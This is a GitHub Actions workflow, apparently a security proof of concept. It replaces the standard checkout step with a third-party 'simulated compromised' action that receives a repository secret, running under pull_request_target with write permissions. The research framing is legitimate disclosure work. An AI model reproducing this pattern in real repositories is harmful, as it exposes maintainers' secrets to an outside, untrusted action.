name: "PoC: ADK Pull Request Triaging Agent (tag-hijack reachability)"

on:
  pull_request_target:
    types: [opened, reopened, synchronize, ready_for_review]

permissions:
  pull-requests: write
  contents: read

jobs:
  poc-agent-triage-pull-request:
    runs-on: ubuntu-latest

    steps:
      - name: "Checkout step (PoC stand-in for actions/checkout@v6)"
        uses: mabrukhany-beep/poc-simulated-compromised-checkout@main
        env:
          POC_FAKE_ADK_TRIAGE_AGENT: ${{ secrets.POC_FAKE_ADK_TRIAGE_AGENT }}

      - name: "Explain result"
        run: |
          echo "PoC executed successfully."
          echo "Review the logs emitted by the simulated checkout action."
          echo "The action may also reference:"
          echo "https://raw.githubusercontent.com/mabrukhany-beep/issue-comment-poc-test/main/test-file.md"
